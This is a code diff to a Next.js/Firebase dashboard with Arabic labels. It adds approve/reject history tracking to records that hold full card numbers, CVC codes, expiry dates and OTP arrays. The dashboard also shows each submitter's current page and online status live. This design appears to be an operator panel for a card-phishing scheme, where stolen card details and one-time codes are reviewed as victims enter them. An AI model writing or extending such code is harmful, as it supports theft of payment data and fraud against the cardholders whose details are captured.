@@ -1,10 +1,10 @@
 'use client'
 
-import { useEffect, useRef, useState } from 'react'
+import { useEffect, useMemo, useRef, useState } from 'react'
 import { useRouter } from 'next/navigation'
 import { onAuthStateChanged, signOut, User } from 'firebase/auth'
 import { auth, db } from '@/lib/firebase'
-import { collection, onSnapshot, doc, updateDoc, query } from 'firebase/firestore'
+import { arrayUnion, collection, onSnapshot, doc, updateDoc, query } from 'firebase/firestore'
 import { Card, CardContent, CardHeader, CardTitle } from '@/app/components/ui/card'
 import { Button } from '@/app/components/ui/button'
 import {
@@ -21,13 +21,23 @@ interface Submission {
   datayaer: string
   CVC: string
   otpArr: string[]
-  cardState: 'pending' | 'approved' | 'rejected'
+  cardState: CardStateValue
   method?: string
   createdAt?: number
+  stateUpdatedAt?: number
   step?: number
   currentPage?: string
   onlineStatus?: 'online' | 'offline'
   lastSeenAt?: number
+  cardStateHistory?: CardStateHistoryEntry[]
+}
+
+type CardStateValue = 'pending' | 'approved' | 'rejected'
+
+type CardStateHistoryEntry = {
+  state: CardStateValue
+  at?: number
+  by?: string
 }
 
 const PAGE_LABELS: Record<string, string> = {
@@ -67,14 +77,51 @@ function isSubmissionOnline(sub: Submission, nowTimestamp: number) {
   return sub.onlineStatus === 'online'
 }
 
+function cardStateText(state: CardStateValue) {
+  if (state === 'approved') return 'مقبول'
+  if (state === 'rejected') return 'مرفوض'
+  return 'قيد المراجعة'
+}
+
+function cardStatePillClass(state: CardStateValue) {
+  if (state === 'approved') return 'bg-green-100 text-green-800 border border-green-200'
+  if (state === 'rejected') return 'bg-red-100 text-red-800 border border-red-200'
+  return 'bg-yellow-100 text-yellow-800 border border-yellow-200'
+}
+
+function getCardStateHistory(sub: Submission) {
+  const raw = Array.isArray(sub.cardStateHistory) ? sub.cardStateHistory : []
+  const normalized = raw
+    .filter((entry): entry is CardStateHistoryEntry => !!entry && !!entry.state)
+    .map((entry) => ({
+      state: entry.state,
+      at: typeof entry.at === 'number' ? entry.at : sub.stateUpdatedAt ?? sub.createdAt ?? 0,
+      by: entry.by,
+    }))
+    .sort((a, b) => (b.at ?? 0) - (a.at ?? 0))
+
+  if (normalized.length > 0) return normalized
+
+  if (sub.cardState === 'approved' || sub.cardState === 'rejected') {
+    return [{
+      state: sub.cardState,
+      at: sub.stateUpdatedAt ?? sub.createdAt ?? 0,
+    }]
+  }
+
+  return []
+}
+
 function buildNotificationSignature(sub: Submission) {
   const otpCount = Array.isArray(sub.otpArr) ? sub.otpArr.filter(Boolean).length : 0
+  const historyCount = Array.isArray(sub.cardStateHistory) ? sub.cardStateHistory.length : 0
   return [
     sub.cardState ?? 'pending',
     sub.step ?? '-',
     sub.currentPage ?? '-',
     sub.onlineStatus ?? '-',
     otpCount,
+    historyCount,
   ].join('|')
 }
 
@@ -286,7 +333,18 @@ export default function Dashboard() {
 
   const updateState = async (id: string, state: 'approved' | 'rejected') => {
     setUpdating(id)
-    try { await updateDoc(doc(db, 'pays', id), { cardState: state }) } catch (e) { console.error(e) }
+    try {
+      const now = Date.now()
+      await updateDoc(doc(db, 'pays', id), {
+        cardState: state,
+        stateUpdatedAt: now,
+        cardStateHistory: arrayUnion({
+          state,
+          at: now,
+          by: user?.email ?? 'admin',
+        }),
+      })
+    } catch (e) { console.error(e) }
     setUpdating(null)
   }
 
@@ -297,6 +355,21 @@ export default function Dashboard() {
     approved: submissions.filter(s => s.cardState === 'approved').length,
     rejected: submissions.filter(s => s.cardState === 'rejected').length,
   }
+
+  const rejectedCardHistory = useMemo(
+    () => submissions
+      .flatMap((sub) => (
+        getCardStateHistory(sub)
+          .filter(entry => entry.state === 'rejected')
+          .map(entry => ({
+            id: sub.id,
+            at: entry.at ?? sub.stateUpdatedAt ?? sub.createdAt,
+            by: entry.by,
+          }))
+      ))
+      .sort((a, b) => (b.at ?? 0) - (a.at ?? 0)),
+    [submissions],
+  )
 
   const stateBadge = (s?: string) => {
     if (s === 'approved') return { label: 'مقبول', cls: 'bg-green-100 text-green-800 border border-green-200' }
@@ -368,6 +441,33 @@ export default function Dashboard() {
           ))}
         </div>
 
+        {!dataLoading && rejectedCardHistory.length > 0 && (
+          <Card className="border-0 shadow-sm bg-white">
+            <CardHeader className="pb-3">
+              <CardTitle className="text-base">سجل البطاقات المرفوضة (حسب رقم الهوية)</CardTitle>
+            </CardHeader>
+            <CardContent>
+              <div className="space-y-2 max-h-60 overflow-auto pr-1">
+                {rejectedCardHistory.map((entry, i) => (
+                  <div key={`${entry.id}-${entry.at ?? 'na'}-${i}`} className="flex flex-col sm:flex-row sm:items-center justify-between gap-1 rounded-lg border border-red-100 bg-red-50/50 px-3 py-2">
+                    <div className="text-sm text-gray-700">
+                      رقم الهوية: <span className="font-mono font-semibold">{entry.id}</span>
+                    </div>
+                    <div className="text-xs text-gray-500 flex items-center gap-2">
+                      <span>
+                        {entry.at
+                          ? new Date(entry.at).toLocaleString('ar-QA', { dateStyle: 'short', timeStyle: 'short' })
+                          : '—'}
+                      </span>
+                      {entry.by && <span className="text-gray-400">({entry.by})</span>}
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </CardContent>
+          </Card>
+        )}
+
         {dataLoading ? (
           <div className="py-20 text-center">
             <RefreshCw className="w-8 h-8 animate-spin text-[#8A1538] mx-auto mb-3" />
@@ -386,6 +486,7 @@ export default function Dashboard() {
               const isPending = !sub.cardState || sub.cardState === 'pending'
               const online = isSubmissionOnline(sub, presenceNow)
               const stepLabel = resolveStepLabel(sub.step, sub.currentPage)
+              const stateHistory = getCardStateHistory(sub)
               const fullCard = (sub.cardNumber || '').replace(/\D/g, '')
               const groupedCard = fullCard.replace(/(.{4})/g, '$1 ').trim()
 
@@ -477,6 +578,28 @@ export default function Dashboard() {
                                   </div>
                                 ))}
                               </div>
+                            </div>
+                          </div>
+                        )}
+
+                        {stateHistory.length > 0 && (
+                          <div>
+                            <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
+                              <Clock className="w-3.5 h-3.5" /> سجل حالة البطاقة
+                            </h3>
+                            <div className="bg-gray-50 rounded-xl p-4 border border-gray-100 space-y-2">
+                              {stateHistory.map((entry, index) => (
+                                <div key={`${entry.state}-${entry.at}-${index}`} className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-1 rounded-lg border border-gray-200 bg-white px-3 py-2">
+                                  <span className={`inline-flex w-fit items-center rounded-full px-2.5 py-1 text-xs font-semibold ${cardStatePillClass(entry.state)}`}>
+                                    {cardStateText(entry.state)}
+                                  </span>
+                                  <span className="text-xs text-gray-500">
+                                    {entry.at
+                                      ? new Date(entry.at).toLocaleString('ar-QA', { dateStyle: 'short', timeStyle: 'short' })
+                                      : '—'}
+                                  </span>
+                                </div>
+                              ))}
                             </div>
                           </div>
                         )}
